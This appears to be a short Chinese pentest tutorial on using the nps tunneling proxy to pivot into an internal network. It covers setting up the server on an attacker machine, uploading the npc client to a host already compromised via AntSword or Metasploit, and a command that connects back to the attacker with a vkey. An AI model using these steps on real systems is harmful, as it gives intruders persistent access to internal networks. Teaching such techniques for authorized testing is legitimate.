# 隧道代理-nps使用

下载地址：

[https://github.com/ehang-io/nps](https://github.com/ehang-io/nps)

使用：

本地windwos作为攻击机启动nps_server

```python
.\nps.exe
```

访问本机：127.0.0.1:8080

默认账户密码是：admin 123 

登录之后接着新建客户端

![Untitled](%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86-nps%E4%BD%BF%E7%94%A8%2002a7cdba10164bafb156b2e77f470aed/Untitled.png)

![Untitled](%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86-nps%E4%BD%BF%E7%94%A8%2002a7cdba10164bafb156b2e77f470aed/Untitled%201.png)

可以直接全部默认，我们只需要vkey值，留空他会自动帮我们生成

![Untitled](%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86-nps%E4%BD%BF%E7%94%A8%2002a7cdba10164bafb156b2e77f470aed/Untitled%202.png)

新建客户端成功

当客户端连接之后，还需要利用隧道去访问客户端内网资产，所以我们这里还要创建一条隧道

![Untitled](%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86-nps%E4%BD%BF%E7%94%A8%2002a7cdba10164bafb156b2e77f470aed/Untitled%203.png)

点击隧道

![Untitled](%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86-nps%E4%BD%BF%E7%94%A8%2002a7cdba10164bafb156b2e77f470aed/Untitled%204.png)

点击新增

![Untitled](%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86-nps%E4%BD%BF%E7%94%A8%2002a7cdba10164bafb156b2e77f470aed/Untitled%205.png)

设置好代理端口，这种是直接在客户端创建隧道，也可以从左侧导航栏创建，不过要设置正确的id值，也就是客户端的id

服务端这边：客户端和隧道新建好之后，下面就是客户端来连接了

加入此刻已经从web撕开了一道口子，成功拿下该机器，可利用蚁剑或者msf等等上传npc客户端

我这边是拿kali当客户端来做演示，所以这里需要上传 linux_amd64_client

![Untitled](%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86-nps%E4%BD%BF%E7%94%A8%2002a7cdba10164bafb156b2e77f470aed/Untitled%206.png)

有两种方式来连接，一种是通过配置文件，另外一种是直接输入命令，这里使用第二种，这两种方法都需要借助这个密钥值

kali执行：

```python
./npc -server=npc_server端地址:客户端连接端口 -vkey=2frlwtth1a6nihww
```

![Untitled](%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86-nps%E4%BD%BF%E7%94%A8%2002a7cdba10164bafb156b2e77f470aed/Untitled%207.png)

成功连接

![Untitled](%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86-nps%E4%BD%BF%E7%94%A8%2002a7cdba10164bafb156b2e77f470aed/Untitled%208.png)

客户端再刷新已经是在线状态了

接着就可以利用代理工具去访问内网资产

![Untitled](%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86-nps%E4%BD%BF%E7%94%A8%2002a7cdba10164bafb156b2e77f470aed/Untitled%209.png)

浏览器设置代理即可访问